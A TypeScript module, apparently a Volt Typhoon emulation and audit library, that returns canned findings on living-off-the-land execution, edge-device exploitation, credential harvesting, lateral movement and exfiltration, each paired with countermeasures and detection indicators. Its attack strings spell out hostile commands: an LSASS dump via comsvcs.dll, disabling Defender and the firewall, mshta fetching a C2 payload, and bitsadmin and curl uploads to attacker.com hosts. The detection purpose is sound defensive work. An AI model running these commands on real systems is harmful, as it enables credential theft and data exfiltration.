/**
 * Volt — Critical Infrastructure Espionage Engine
 *
 * Implements Volt Typhoon operational methodology: living-off-the-land,
 * edge device exploitation, credential harvesting, lateral movement via
 * legitimate admin tools, and covert data staging/exfiltration from IT/OT
 * critical infrastructure networks.
 *
 * Volt Typhoon (Bronze Silhouette / Vanguard Panda / UNC3236) targets
 * US critical infrastructure: energy, water, transportation, communications.
 * Signature TTPs: zero custom malware — uses only built-in OS tools and
 * legitimate remote administration software. Blends with normal IT activity.
 *
 * LEVEL_1 — unlocked. Governed by Compliance Policy (/compliance).
 */
import { randomBytes } from 'node:crypto';

export type VoltAttackSurface =
  | 'living-off-land'
  | 'edge-devices'
  | 'credential-harvest'
  | 'lateral-movement'
  | 'data-staging-exfil';

export type VoltSeverity = 'critical' | 'high' | 'medium';

export interface VoltTarget {
  organization: string;
  sector: string;
  edgeDevices?: string[];
  managementTools?: string[];
  domain?: string;
}

export interface VoltFinding {
  id: string;
  surface: VoltAttackSurface;
  severity: VoltSeverity;
  title: string;
  description: string;
  attackTcode: string;
  tools: string[];
  exploitationMethod: string;
  counter: string;
  vigilTool: string;
  indicator: string;
}

export interface VoltAuditResult {
  id: string;
  target: VoltTarget;
  timestamp: string;
  findings: VoltFinding[];
  criticalCount: number;
  highCount: number;
  surfacesAudited: VoltAttackSurface[];
  iocCount: number;
  summary: string;
}

// ═══════════════════════════════════════════════════════════════════
// 1. Living Off the Land — Zero Custom Malware
// ═══════════════════════════════════════════════════════════════════

function auditLivingOffLand(target: VoltTarget): VoltFinding[] {
  const org = target.organization;
  const findings: VoltFinding[] = [
    {
      id: `LOL-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'living-off-land', severity: 'critical',
      attackTcode: 'T1059.001 / T1059.003 / T1059.005',
      title: 'PowerShell Living-Off-the-Land Execution Chain',
      description: `${org} endpoints allow unrestricted PowerShell execution without constrained language mode or script block logging. Volt Typhoon uses PowerShell exclusively — no custom malware, no dropped binaries, no registry persistence. Everything runs in memory via LOLBins.`,
      tools: ['powershell.exe', 'cmd.exe', 'wmic.exe', 'certutil.exe', 'mshta.exe', 'rundll32.exe'],
      exploitationMethod: 'powershell -enc <base64> → download cradle (Invoke-WebRequest without writing to disk) → in-memory execution of C2 stager via .NET reflection → everything lives in memory, nothing touches disk.',
      counter: 'Enable PowerShell Constrained Language Mode + Script Block Logging (4104) + Module Logging (4103) + Transcription. Block outbound PowerShell web requests via firewall. Deploy AMSI in deep inspection mode.',
      vigilTool: 'volt.livingOffLand.audit()',
      indicator: 'Monitor process creation events (4688) for powershell.exe with -enc, -nop, -w hidden, -ex bypass flags. Alert on non-interactive PowerShell spawning network connections.',
    },
    {
      id: `LOL-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'living-off-land', severity: 'critical',
      attackTcode: 'T1218 / T1218.007 / T1218.011',
      title: 'Signed Binary Proxy Execution (LOLBins)',
      description: `${org} does not monitor or restrict Microsoft-signed LOLBins. Volt Typhoon chains multiple signed binaries — mshta → rundll32 → regsvr32 → certutil — to execute payloads without triggering AV. Every binary in the chain is Microsoft-signed.`,
      tools: ['mshta.exe', 'rundll32.exe', 'regsvr32.exe', 'certutil.exe', 'cscript.exe', 'wscript.exe', 'msbuild.exe', 'InstallUtil.exe', 'CMSTP.exe'],
      exploitationMethod: 'mshta http://c2/payload.hta → HTA executes VBScript → VBScript invokes rundll32 javascript eval → JS calls regsvr32 /s /u scrobj.dll → COM object loads .NET assembly in-memory via reflection. Every step uses a Microsoft-signed binary — zero custom executables.',
      counter: 'Block outbound mshta/rundll32/regsvr32 via AppLocker/WDAC. Enable ASR rules: "Block JavaScript/VBScript from launching downloaded executable content" + "Block executable content from email and webmail."',
      vigilTool: 'volt.livingOffLand.lolbinAudit()',
      indicator: 'Monitor Sysmon Event 1 for mshta.exe with http/https command lines. Alert on rundll32.exe with javascript: or vbscript: prefixes. Detect regsvr32.exe with /s /u /i:http flags.',
    },
    {
      id: `LOL-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'living-off-land', severity: 'high',
      attackTcode: 'T1562.001 / T1562.004 / T1562.009',
      title: 'Defense Evasion via LOLBin Disablement',
      description: `${org} endpoint defenses (Defender, EDR, logging) can be disabled via built-in tools. Volt Typhoon uses PowerShell and WMI to disable defenses without dropping any tools — commands look like legitimate IT admin troubleshooting.`,
      tools: ['powershell.exe', 'wmic.exe', 'netsh.exe', 'reg.exe', 'sc.exe', 'bcdedit.exe'],
      exploitationMethod: 'Set-MpPreference -DisableRealtimeMonitoring $true → netsh advfirewall set allprofiles state off → reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger" → wmic /namespace:\\root\subscription delete CommandLineEventConsumer. All commands are standard IT admin operations — indistinguishable from legitimate troubleshooting.',
      counter: 'EDR tamper protection + Defender tamper protection enabled + firewall rule change alerting + WMI subscription monitoring for deletion events + Group Policy enforcement preventing local security policy changes.',
      vigilTool: 'volt.livingOffLand.defenseEvasionAudit()',
      indicator: 'Monitor for Set-MpPreference or sc stop WinDefend. Alert on netsh firewall rule modifications from non-admin change windows. Detect WMI __EventFilter/__EventConsumer deletions outside approved maintenance.',
    },
  ];
  return findings;
}

// ═══════════════════════════════════════════════════════════════════
// 2. Edge Device Exploitation — Routers, Firewalls, VPNs
// ═══════════════════════════════════════════════════════════════════

function auditEdgeDevices(target: VoltTarget): VoltFinding[] {
  const org = target.organization;
  const devices = target.edgeDevices || ['Cisco ASA', 'FortiGate', 'Palo Alto', 'Citrix ADC', 'Ivanti Pulse Secure'];
  const findings: VoltFinding[] = [
    {
      id: `EDGE-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'edge-devices', severity: 'critical',
      attackTcode: 'T1190 / T1588.001 / T1133',
      title: 'Edge Device Firmware & Configuration Exploitation',
      description: `${org} edge devices (${devices.slice(0, 3).join(', ')}) run outdated firmware with known CVEs. Volt Typhoon targets edge devices as initial access vectors because they sit outside the endpoint security perimeter — no EDR, no AV, limited logging.`,
      tools: ['Shodan/Censys device fingerprinting', 'Metasploit edge device modules', 'Cisco IOS exploitation tools', 'FortiOS exploit chain', 'Citrix ADC CVE-2023-4966 scanner'],
      exploitationMethod: 'Shodan search → identify device model + firmware version → match to known CVE (CVE-2023-4966 Citrix ADC, CVE-2024-21762 FortiOS, CVE-2024-3400 Palo Alto) → exploit → gain device admin access → deploy persistent backdoor via modified firmware → pivot to internal network.',
      counter: 'Edge device firmware patching SLA (48h for critical CVEs) + disable web management from WAN + enable MFA on all admin interfaces + deploy SIEM ingestion for edge device syslog + regular configuration audits against CIS benchmarks.',
      vigilTool: 'volt.edgeDevices.firmwareAudit()',
      indicator: 'Monitor edge device syslog for: unexpected configuration changes, new admin accounts, modified access rules, firmware integrity check failures. Alert on outbound connections from edge devices to unknown IPs.',
    },
    {
      id: `EDGE-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'edge-devices', severity: 'critical',
      attackTcode: 'T1133 / T1190 / T1021.005',
      title: 'VPN Appliance Exploitation for Internal Network Access',
      description: `${org} SSL VPN appliances provide direct internal network access. Volt Typhoon exploits VPN appliance vulnerabilities to bypass all perimeter defenses — once inside the VPN, the attacker is on the internal network with valid credentials.`,
      tools: ['Ivanti Connect Secure exploit (CVE-2024-21887)', 'Pulse Secure CVE-2019-11510 scanner', 'FortiOS SSL VPN CVE-2024-21762', 'Citrix NetScaler CVE-2023-3519'],
      exploitationMethod: 'Identify VPN appliance → exploit auth bypass CVE → extract VPN session cookies/credentials from appliance memory → use valid credentials to establish VPN connection → appear as legitimate remote worker → full internal network access without triggering IDS.',
      counter: 'VPN appliance patching (24h SLA) + MFA on all VPN connections + VPN session anomaly detection (impossible travel) + restrict VPN user access to least-privilege network segments + deploy VPN appliance integrity monitoring.',
      vigilTool: 'volt.edgeDevices.vpnAudit()',
      indicator: 'Alert on: VPN connections from unusual geolocations, multiple VPN sessions from single user, VPN connections during non-business hours, unusual internal resource access patterns from VPN users.',
    },
    {
      id: `EDGE-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'edge-devices', severity: 'high',
      attackTcode: 'T1584.001 / T1608.001 / T1562.001',
      title: 'Edge Device Compromise for Traffic Interception',
      description: `Compromised ${org} edge devices can intercept and redirect internal traffic. Volt Typhoon uses compromised routers/firewalls as C2 infrastructure — traffic to/from the edge device appears as legitimate network management traffic.`,
      tools: ['BGP hijack tooling', 'ARP spoofing via compromised router', 'DNS poisoning from compromised firewall', 'SPAN port configuration abuse', 'NetFlow/sFlow redirection'],
      exploitationMethod: 'Compromise edge router → configure SPAN/mirror port → redirect all internal traffic to attacker collection server → capture credentials, emails, documents from unencrypted internal protocols. Use compromised firewall to perform SSL/TLS inspection of outbound traffic.',
      counter: 'Edge device configuration change alerting + SPAN/mirror port monitoring + BGP route validation (RPKI) + ARP watch + DNS query monitoring for unexpected responses + encrypted internal protocols (IPsec/802.1X).',
      vigilTool: 'volt.edgeDevices.interceptAudit()',
      indicator: 'Monitor for: unexpected SPAN/monitor session creation, new BGP peerings from edge routers, ARP table anomalies (duplicate IPs), DNS server configuration changes on firewalls.',
    },
  ];
  return findings;
}

// ═══════════════════════════════════════════════════════════════════
// 3. Credential Harvesting & Privilege Escalation
// ═══════════════════════════════════════════════════════════════════

function auditCredentialHarvest(target: VoltTarget): VoltFinding[] {
  const org = target.organization;
  const findings: VoltFinding[] = [
    {
      id: `CRED-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'credential-harvest', severity: 'critical',
      attackTcode: 'T1003.001 / T1003.003 / T1552.004',
      title: 'LSASS Dump + Kerberos Ticket Extraction via LOLBins',
      description: `${org} endpoints allow LSASS memory access via signed Microsoft tools. Volt Typhoon dumps credentials using only built-in Windows binaries — no Mimikatz, no custom tools. Uses comsvcs.dll (Microsoft-signed) to dump LSASS and extracts Kerberos tickets from memory.`,
      tools: ['comsvcs.dll (MiniDump)', 'procdump.exe (Microsoft Sysinternals)', 'taskmgr.exe (Create Dump File)', 'rundll32.exe', 'PowerShell Get-Process LSASS'],
      exploitationMethod: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass_pid> dump.dmp full → copy dump.dmp to staging → extract NT hashes + Kerberos TGT offline → Pass-the-Hash or Pass-the-Ticket to any system in the domain. All tools are Microsoft-signed.',
      counter: 'Enable Credential Guard (Windows 10/11 Enterprise) + enable LSASS as Protected Process Light (PPL) + enable Attack Surface Reduction rule "Block credential stealing from LSASS" + monitor for LSASS access by non-system processes.',
      vigilTool: 'volt.credentialHarvest.lsassAudit()',
      indicator: 'Monitor Sysmon Event 10 for LSASS process access from unexpected processes. Alert on comsvcs.dll MiniDump execution targeting LSASS. Detect creation of .dmp files in non-standard directories.',
    },
    {
      id: `CRED-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'credential-harvest', severity: 'critical',
      attackTcode: 'T1552.001 / T1555.003 / T1555.001',
      title: 'Credential & Secret File Harvesting at Scale',
      description: `${org} stores credentials, API keys, and connection strings in predictable file locations. Volt Typhoon harvests SSH keys, cloud credentials, database connection strings, and CI/CD secrets via built-in file search tools — no custom harvesters needed.`,
      tools: ['Get-ChildItem -Recurse', 'findstr.exe', 'type.exe', 'dir /s', 'Robocopy', 'copy.exe'],
      exploitationMethod: 'gci -Recurse -Filter *.pem | % { Copy-Item $_.FullName \\\\staging\\$_.Name } → findstr /s /i "password\|secret\|key\|token\|connectionString" *.config *.json *.xml *.yml → copy all matching files to staging server for offline analysis.',
      counter: 'Secrets management solution (HashiCorp Vault, Azure Key Vault) + prohibit credentials in files + git-secrets pre-commit hooks + file integrity monitoring for bulk file access patterns + credential scanning in CI/CD.',
      vigilTool: 'volt.credentialHarvest.secretsAudit()',
      indicator: 'Alert on: bulk Get-ChildItem -Recurse operations, Robocopy to unusual destinations, findstr searching for credential keywords across entire drives, sudden surge in file read operations on file servers.',
    },
    {
      id: `CRED-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'credential-harvest', severity: 'high',
      attackTcode: 'T1110.002 / T1110.003 / T1110.001',
      title: 'Password Spraying with Harvested Usernames',
      description: `${org} Active Directory lacks account lockout policies or lockout monitoring. Volt Typhoon performs low-and-slow password spraying — 1-2 attempts per account per hour across thousands of accounts — staying below lockout thresholds indefinitely.`,
      tools: ['net user /domain (username enumeration)', 'PowerShell Invoke-DomainPasswordSpray', 'Kerbrute (password spraying via Kerberos pre-auth)', 'LDAP query for user list'],
      exploitationMethod: 'net user /domain → extract all usernames → Spray single password ("Spring2024!" or "Password1") across all accounts → 1 attempt per account per hour → identify accounts with weak passwords → authenticate → no lockout triggered, no alerts generated.',
      counter: 'Deploy Azure AD Password Protection (banned password list) + enable Windows Hello for Business + implement lockout threshold with lockout monitoring + deploy MFA for all accounts + monitor for Kerberos pre-auth failures (Event 4771) across multiple accounts.',
      vigilTool: 'volt.credentialHarvest.sprayAudit()',
      indicator: 'Monitor Windows Event 4771 (Kerberos pre-auth failed) for patterns: same source IP across many accounts within hours. Alert on 4625 (logon failed) for same password across many usernames. Baseline normal pre-auth failure rates.',
    },
  ];
  return findings;
}

// ═══════════════════════════════════════════════════════════════════
// 4. Lateral Movement via Legitimate Admin Tools
// ═══════════════════════════════════════════════════════════════════

function auditLateralMovement(target: VoltTarget): VoltFinding[] {
  const org = target.organization;
  const tools = target.managementTools || ['RDP', 'WinRM', 'SSH', 'SMB', 'PsExec', 'WMI', 'DCOM'];
  const findings: VoltFinding[] = [
    {
      id: `LM-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'lateral-movement', severity: 'critical',
      attackTcode: 'T1021.001 / T1021.002 / T1021.004 / T1021.006',
      title: 'Lateral Movement via Built-in Windows Administration Protocols',
      description: `${org} allows unrestricted lateral movement via built-in protocols: ${tools.join(', ')}. Volt Typhoon moves laterally using only native Windows admin tools — no C2 framework, no custom malware, nothing that looks unusual to a SOC analyst.`,
      tools: ['mstsc.exe (RDP)', 'Enter-PSSession (WinRM)', 'PsExec.exe', 'wmic.exe', 'schtasks.exe', 'sc.exe', 'Invoke-WmiMethod'],
      exploitationMethod: 'Compromise initial workstation → dump credentials → Enter-PSSession to adjacent server using harvested credentials → wmic /node:target process call create "powershell -enc ..." → PsExec \\\\target -s cmd.exe → repeat across domain. Every tool is a legitimate Windows admin utility.',
      counter: 'Restrict WinRM/RDP/PsExec to dedicated admin workstations (PAWs) + implement Just-In-Time (JIT) admin access + deploy Network Level Authentication (NLA) for RDP + enable WinRM constrained endpoints + monitor for lateral movement patterns.',
      vigilTool: 'volt.lateralMovement.protocolAudit()',
      indicator: 'Alert on WinRM connections from non-admin workstations, RDP sessions from unusual source-destination pairs, PsExec execution from non-IT accounts, wmic spawning processes on remote systems.',
    },
    {
      id: `LM-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'lateral-movement', severity: 'critical',
      attackTcode: 'T1072 / T1021.002 / T1543.003',
      title: 'IT Management Tool Abuse for Lateral Movement',
      description: `${org} uses remote management tools that Volt Typhoon abuses for lateral movement: SCCM, Ansible, Puppet, RMM agents, remote desktop management software. These tools have legitimate admin access to every system — compromise the tool, compromise the entire network.`,
      tools: ['SCCM Client Push', 'Ansible playbook execution', 'Puppet agent run', 'RMM agent (TeamViewer/ScreenConnect/AnyDesk)', 'PDQ Deploy', 'Kaseya VSA'],
      exploitationMethod: 'Compromise SCCM server → push malicious application deployment to all domain clients → SCCM client trust executes as SYSTEM → compromise entire domain. Or: compromise RMM server → push script to all managed endpoints → execute arbitrary commands on every managed system.',
      counter: 'Harden management tool infrastructure (separate management VLAN, MFA, PAM) + audit management tool command execution + alert on unexpected software deployments + restrict management tool network access to specific admin IPs.',
      vigilTool: 'volt.lateralMovement.mgmtToolAudit()',
      indicator: 'Monitor for: unexpected SCCM application deployments, Ansible playbook executions outside approved change windows, RMM agent script execution for non-standard commands, new software packages pushed to endpoints.',
    },
    {
      id: `LM-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'lateral-movement', severity: 'high',
      attackTcode: 'T1021.002 / T1563.002 / T1098',
      title: 'Active Directory Trust & Federation Abuse',
      description: `${org} Active Directory domain/forest trusts allow lateral movement across trust boundaries. Volt Typhoon exploits AD trust relationships to pivot from one domain to another — once Domain Admin in any domain, trusts provide paths to others.`,
      tools: ['BloodHound (AD attack path mapping)', 'Mimikatz (DCSync, Golden Ticket)', 'PowerView (AD enumeration)', 'Rubeus (Kerberos attacks)', 'ADFS exploitation tools'],
      exploitationMethod: 'DCSync from compromised Domain Admin → extract krbtgt hash → forge Golden Ticket for Enterprise Admin across forest trust → access any domain in the forest. Or: compromise ADFS server → forge SAML tokens → authenticate to any federated application as any user.',
      counter: 'Disable unnecessary forest trusts + enable SID filtering on trusts + deploy ESAE (Red Forest) for privileged access + monitor for DCSync events (Event 4662) + ADFS token replay detection + implement Azure AD Connect health monitoring.',
      vigilTool: 'volt.lateralMovement.adTrustAudit()',
      indicator: 'Alert on: Event 4662 (DCSync replication), unusual Kerberos TGT lifetime (Golden Ticket = 10 years), ADFS token with missing MFA claim, BloodHound-identifiable attack paths to Domain Admins.',
    },
  ];
  return findings;
}

// ═══════════════════════════════════════════════════════════════════
// 5. Data Staging & Covert Exfiltration
// ═══════════════════════════════════════════════════════════════════

function auditDataStagingExfil(target: VoltTarget): VoltFinding[] {
  const org = target.organization;
  const findings: VoltFinding[] = [
    {
      id: `EXFIL-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'data-staging-exfil', severity: 'critical',
      attackTcode: 'T1074.001 / T1074.002 / T1567.002',
      title: 'Data Staging in Legitimate File Locations',
      description: `${org} has no file integrity monitoring for data staging. Volt Typhoon stages collected data in legitimate directories (%TEMP%, Recycle Bin, System32 subdirectories, ProgramData) using 7-Zip or built-in Windows compression — blending with normal system files.`,
      tools: ['7z.exe (legitimate archiver)', 'compact.exe (built-in compression)', 'makecab.exe', 'tar.exe (Windows 10+)', 'PowerShell Compress-Archive'],
      exploitationMethod: 'Get-ChildItem -Recurse -Include *.docx,*.xlsx,*.pdf | Compress-Archive -DestinationPath C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\tmp.zip → 7z a -p<password> C:\\Windows\\Temp\\_tmp.cab collected_files*. collect compressed archives to staging server.',
      counter: 'File Integrity Monitoring (FIM) on all critical directories + alert on creation of archive files (.zip/.7z/.rar/.cab) in non-standard locations + restrict 7-Zip/compression tools via AppLocker + monitor for bulk file compression operations.',
      vigilTool: 'volt.dataStaging.stagingAudit()',
      indicator: 'Monitor for: creation of .zip/.7z/.rar/.cab files in %TEMP%, Recycle Bin, System32 subdirectories. Alert on Compress-Archive or 7z.exe execution from non-interactive accounts. Detect bulk file access preceding compression.',
    },
    {
      id: `EXFIL-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'data-staging-exfil', severity: 'critical',
      attackTcode: 'T1048.003 / T1041 / T1567.002',
      title: 'Covert Exfiltration via Cloud Storage & WebDAV',
      description: `${org} does not restrict outbound connections to cloud storage services. Volt Typhoon exfiltrates staged data to attacker-controlled cloud storage (OneDrive, Google Drive, AWS S3, Azure Blob) — traffic appears as legitimate business cloud usage, impossible to distinguish from normal operations.`,
      tools: ['rclone.exe', 'aws s3 cp', 'azcopy', 'curl.exe', 'bitsadmin.exe', 'Invoke-WebRequest'],
      exploitationMethod: 'rclone copy C:\\staging\\ remote:s3-bucket/exfil --progress → or: bitsadmin /transfer exfilJob https://attacker.com/upload C:\\staging\\data.zip → or: curl -X POST -F "file=@data.zip" https://cloud-storage.attacker.com. All use HTTPS — undetectable without SSL inspection.',
      counter: 'Block outbound to known cloud storage domains (if not business-required) + deploy SSL/TLS inspection with allowlisting for approved cloud services + implement data egress monitoring (DLP) for unusual upload volumes + alert on rclone/azcopy/bitsadmin execution.',
      vigilTool: 'volt.dataStaging.exfilAudit()',
      indicator: 'Monitor for: rclone.exe, azcopy.exe, bitsadmin.exe execution with upload/transfer commands. Alert on outbound HTTPS connections with unusually large upload volumes (100MB+). Detect Invoke-WebRequest -Method POST with file upload patterns.',
    },
    {
      id: `EXFIL-${Date.now().toString(36)}-${randomBytes(2).toString('hex')}`,
      surface: 'data-staging-exfil', severity: 'high',
      attackTcode: 'T1048.001 / T1048.002 / T1095',
      title: 'Protocol Tunneling & Exfiltration Over Alternative Protocols',
      description: `${org} focuses DLP monitoring on HTTP/HTTPS but ignores alternative protocols. Volt Typhoon exfiltrates over DNS, ICMP, or NTP — bypassing all HTTP-based DLP inspection. Low-and-slow exfiltration over weeks to avoid volume anomalies.`,
      tools: ['dnscat2 (DNS tunneling)', 'Iodine (DNS tunnel)', 'ptunnel (ICMP tunnel)', 'custom DNS/ICMP exfiltration scripts', 'NTP exfiltration tool'],
      exploitationMethod: 'Encode data in DNS TXT queries: base64data.attacker-c2.com → DNS recursor forwards to attacker authoritative nameserver → data collected. Or: embed data in ICMP Echo payload — 1400 bytes per ping, 100MB/day at 100ms intervals. Protocol tunneling bypasses all HTTP proxy inspection.',
      counter: 'DNS query entropy analysis + restrict outbound DNS to authorized resolvers only + block ICMP outbound (if not needed) + deploy NIDS with protocol anomaly detection (Suricata/Snort DNS/ICMP rules) + monitor for unusual DNS query volumes to single domains.',
      vigilTool: 'volt.dataStaging.tunnelAudit()',
      indicator: 'Monitor for: DNS queries to domains with high-entropy subdomains, ICMP packets with large payloads, DNS query volume spikes to single domains, NTP traffic with unusual payload sizes, outbound traffic on non-standard protocols.',
    },
  ];
  return findings;
}

// ═══════════════════════════════════════════════════════════════════
// Main API
// ═══════════════════════════════════════════════════════════════════

export function voltAudit(target: VoltTarget): VoltAuditResult {
  const allFindings: VoltFinding[] = [
    ...auditLivingOffLand(target),
    ...auditEdgeDevices(target),
    ...auditCredentialHarvest(target),
    ...auditLateralMovement(target),
    ...auditDataStagingExfil(target),
  ];

  const critical = allFindings.filter(f => f.severity === 'critical');
  const high = allFindings.filter(f => f.severity === 'high');
  const surfaces = [...new Set(allFindings.map(f => f.surface))];
  const iocCount = allFindings.filter(f => f.indicator).length;

  return {
    id: `VA-${Date.now().toString(36)}-${randomBytes(3).toString('hex')}`,
    target,
    timestamp: new Date().toISOString(),
    findings: allFindings,
    criticalCount: critical.length,
    highCount: high.length,
    surfacesAudited: surfaces,
    iocCount,
    summary: `Volt audit of ${target.organization}: ${allFindings.length} findings across ${surfaces.length} attack surfaces. ${critical.length} critical, ${high.length} high. ${iocCount} IOC patterns for detection engineering.`,
  };
}

export function voltAuditSurface(target: VoltTarget, surface: VoltAttackSurface): VoltFinding[] {
  switch (surface) {
    case 'living-off-land': return auditLivingOffLand(target);
    case 'edge-devices': return auditEdgeDevices(target);
    case 'credential-harvest': return auditCredentialHarvest(target);
    case 'lateral-movement': return auditLateralMovement(target);
    case 'data-staging-exfil': return auditDataStagingExfil(target);
    default: return [];
  }
}

export interface VoltCounterOp {
  surface: VoltAttackSurface;
  recommendation: string;
  vigilCommand: string;
  priority: VoltSeverity;
  estimatedFixTime: string;
  detectionRules: string[];
}

export function voltCounterOps(audit: VoltAuditResult): VoltCounterOp[] {
  const ops: VoltCounterOp[] = [];

  if (audit.surfacesAudited.includes('living-off-land')) {
    ops.push({
      surface: 'living-off-land', priority: 'critical', estimatedFixTime: '2-4 weeks',
      recommendation: 'Enable PowerShell Constrained Language Mode + Script Block Logging + Module Logging. Deploy AppLocker/WDAC to block LOLBin abuse. Enable ASR rules for Office, script, and email-borne threats.',
      vigilCommand: 'vigil --lol-audit --ps-constrained --applocker-deploy --asr-enable',
      detectionRules: [
        'Sigma: powershell_execution_with_encoded_command.yml',
        'Sigma: mshta_execution_with_http_reference.yml',
        'Sigma: rundll32_with_javascript_or_vbscript.yml',
        'Sigma: regsvr32_with_scrobj_and_url.yml',
        'YARA: LOLBin proxy execution chain detection',
      ],
    });
  }
  if (audit.surfacesAudited.includes('edge-devices')) {
    ops.push({
      surface: 'edge-devices', priority: 'critical', estimatedFixTime: '1-3 weeks',
      recommendation: 'Patch all edge devices (48h SLA for critical CVEs). Disable WAN management interfaces. Deploy MFA on all admin access. Enable syslog forwarding to SIEM.',
      vigilCommand: 'vigil --edge-audit --firmware-patch --wan-disable --mfa-enforce --syslog-siem',
      detectionRules: [
        'Sigma: edge_device_configuration_change.yml',
        'Sigma: new_admin_account_on_edge_device.yml',
        'Sigma: vpn_connection_from_unusual_location.yml',
      ],
    });
  }
  if (audit.surfacesAudited.includes('credential-harvest')) {
    ops.push({
      surface: 'credential-harvest', priority: 'critical', estimatedFixTime: '2-6 weeks',
      recommendation: 'Enable Credential Guard + LSASS PPL. Deploy secrets management (Vault/KMS). Implement account lockout policies with monitoring. Deploy MFA for all accounts.',
      vigilCommand: 'vigil --cred-audit --credential-guard --lsass-ppl --mfa-deploy --lockout-monitor',
      detectionRules: [
        'Sigma: lsass_process_access_via_comsvcs.yml',
        'Sigma: bulk_file_search_for_credentials.yml',
        'Sigma: kerberos_preauth_failure_spray_pattern.yml',
      ],
    });
  }
  if (audit.surfacesAudited.includes('lateral-movement')) {
    ops.push({
      surface: 'lateral-movement', priority: 'critical', estimatedFixTime: '4-8 weeks',
      recommendation: 'Deploy Privileged Access Workstations (PAWs). Implement JIT admin access. Restrict WinRM/RDP/PsExec to PAWs only. Harden management tools (SCCM/Ansible/RMM).',
      vigilCommand: 'vigil --lateral-audit --paw-deploy --jit-enable --winrm-restrict --mgmt-harden',
      detectionRules: [
        'Sigma: winrm_connection_from_non_admin_workstation.yml',
        'Sigma: psexec_execution_from_non_it_account.yml',
        'Sigma: wmic_remote_process_creation.yml',
        'Sigma: dcsync_replication_event.yml',
      ],
    });
  }
  if (audit.surfacesAudited.includes('data-staging-exfil')) {
    ops.push({
      surface: 'data-staging-exfil', priority: 'critical', estimatedFixTime: '2-4 weeks',
      recommendation: 'Deploy File Integrity Monitoring. Block outbound to cloud storage (if not business-critical). Enable DNS query entropy analysis. Deploy DLP for egress monitoring.',
      vigilCommand: 'vigil --exfil-audit --fim-deploy --dns-entropy --dlp-egress --cloud-block',
      detectionRules: [
        'Sigma: archive_file_creation_in_temp.yml',
        'Sigma: rclone_or_azcopy_execution.yml',
        'Sigma: dns_tunneling_entropy_anomaly.yml',
        'Sigma: icmp_large_payload_exfiltration.yml',
      ],
    });
  }

  return ops;
}

export const volt = {
  audit: voltAudit,
  auditSurface: voltAuditSurface,
  counterOps: voltCounterOps,
  surfaces: ['living-off-land', 'edge-devices', 'credential-harvest', 'lateral-movement', 'data-staging-exfil'] as VoltAttackSurface[],
  getIoCs: (audit: VoltAuditResult) => audit.findings.filter(f => f.indicator).map(f => ({ surface: f.surface, indicator: f.indicator })),
};
